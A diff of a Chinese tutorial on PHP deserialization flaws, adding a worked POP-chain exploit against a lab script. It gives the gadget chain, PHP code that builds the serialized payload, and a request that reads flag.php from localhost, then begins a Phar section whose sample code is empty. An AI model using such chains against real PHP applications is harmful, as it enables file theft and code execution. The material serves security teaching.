@@ -262,7 +262,9 @@ var_dump(unserialize($data));
 
 ### PHP反序列化漏洞分析
 
-#### 一个简单的反序列化漏洞
+#### POP链
+
+##### 一个简单的反序列化漏洞
 
 来看一个十分简单的案例：
 
@@ -297,7 +299,7 @@ $obj = unserialize($_GET['data']);
 2. 存在一个合适的魔术方法作为`跳板`
 3. 能够将程序流程导向恶意流程
 
-#### POP链构造
+##### POP链构造
 
 POP构造最主要是利用魔术方法，然后在魔术方法中调用其他函数，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，这样就可以通过控制反序列化字符串达到利用反序列化漏洞的目的。
 
@@ -415,5 +417,130 @@ else
 
 这里的话，注意到，我们已经连起来了一条链了`Test::__get ==> Read::__invoke`。
 
-那么我们如何去触发`Test::__get`呢？也是前面的魔术方法提到过的，`__get`方法是读取不可访问属性时调用的。
+那么我们如何去触发`Test::__get`呢？也是前面的魔术方法提到过的，`__get`方法是读取不可访问属性时调用的。去寻找时应该可以发现，在`Show::__toString`中，获取了`$this->str['str']->source`，那么在这里，如果`$this->str['str']`的`source`属性是不可访问属性的话，就会调用其对象的`__get`方法。
+
+那么在这里，就向已经存在的链加上一个：`Show::__toString ==> Test::__get ==> Read::__invoke`。
+
+接下来需要考虑的是，`Show::__toString`是如何调用的呢？
+
+可以注意到，在`Show::__wakeup`中，将`$this->source`视为字符串进行了`preg_match`，这里显然会调用其对应的`__toString`方法，于是构成了：
+
+```php
+Show::__wakeup ==> Show::__toString ==> Test::__get ==> Read::__invoke
+```
+
+从上面的构造链来看，这就让反序列化时可以让攻击者走向最终读取文件并回显的函数。
+
+接下来看看怎么从上面的链来构造Payload，首先，虽然分析是从后往前进行分析的，但是构造肯定是从前往后构造的，我个人喜欢是先生成所有的对象，再去一一设置成员关系，所以这里肯定是要先去分析这里一共有几个对象。
+
+从上面的构造链来看，三个类，那么至少是三个对象，有没有可能有更多呢？有，在这里需要四个，为什么呢？因为注意看导向到`__toString`方法的前提是，`Show::this->source`也是一个`Show`对象，这才会调用其对应的`__toString`。
+
+首先构造三个对象：
+
+```php
+class Read
+{
+    public $var;
+}
+
+class Show
+{
+    public $source;
+    public $str;
+}
+
+class Test
+{
+    public $p;
+}
+
+$show = new Show();
+$show2 = new Show();
+$test = new Test();
+$read = new Read();
+```
+
+接下来从前往后进行填充数据，首先是`Show`对象，反序列化时会自动调用其`__wakeup`方法，这里会直接导向到它的`source`的`__toString`，那么在`Show::__toString`中呢，访问的是`$this->str['str']->source`，前面分析这里是调用`__get`的点，那么这两个`Show`对象填充起来就没什么问题了。
+
+```php
+$show->source = $show2;
+$show2->str = array('str' => $test);
+```
+
+接下来看`Test`是怎么填充的，注意这里已经是到了`Test::__get`方法，这里只需要将`$this->p`设为一个`Read`对象即可调用`Read::__invoke`，于是：
+
+```php
+$test->p = $read;
+```
+
+再看最后的`Read`对象，这里就没啥好说的了，直接设置其`$var`即可：
+
+```php
+$read->var = 'flag.php';
+```
+
+然后组合起来，并且将其进行序列化可以得到：
+
+```php
+<?php
+class Read
+{
+    public $var;
+}
+
+class Show
+{
+    public $source;
+    public $str;
+}
+
+class Test
+{
+    public $p;
+}
+
+$show = new Show();
+$show2 = new Show();
+$test = new Test();
+$read = new Read();
+
+$show->source = $show2;
+$show2->str = array('str' => $test);
+$test->p = $read;
+$read->var = 'flag.php';
+echo serialize($show);
+// O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:4:"Test":1:{s:1:"p";O:4:"Read":1:{s:3:"var";s:8:"flag.php";}}}}s:3:"str";N;}
+```
+
+```powershell
+$ Invoke-WebRequest -Uri http://localhost/ -Method Get -Body @{hello='O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:4:"Test":1:{s:1:"p";O:4:"Read":1:{s:3:"var";s:8:"flag.php";}}}}s:3:"str";N;}'} | Select-Object content
+Invoke-WebRequest: PD9waHANCiRmbGFnID0gJ0ZMQUd7YzY0MTk5MTY3NGIwMDYzNjdjYTM0MDA3YjM0ODc1NWM1ZmFiMDAyZH0nOw0K
+```
+
+解码后就拿到了Flag.php的代码。
+
+##### POP链的总结
+
+上面只是一个最简单的样例，实际上，在ThinkPHP中、Yii中，有很多的类、很多的方法，如何在确定反序列化点存在时，我们可以通过ThinkPHP或者Yii这一框架去直接进行POP链的构造，去直接利用，这才是一个难点。在哪儿有`eval`、`assert`等危险函数，怎么一步一步跳转到这个函数去进一步利用，在海量的代码前面怎么做，这才是难点所在。
+
+#### Phar反序列化
+
+##### Phar概述
+
+Phar的本质是一个压缩文件，反序列化攻击的核心是其中`序列化存储的用户自定义的meta-data`。
+
+##### Phar文件结构
+
+* stub: phar文件标志，必须是以`xxx __HALT_COMPILER();?>`结尾，否则无法识别，`xxx`可自定义
+* manifest: phar压缩信息
+* content: 被压缩文件的内容
+* signature(可空): 签名，末尾处
+
+##### Phar的生成
+
+使用PHP代码即可生成Phar，相当方便，样例如下：
+
+```php
+
+```
 
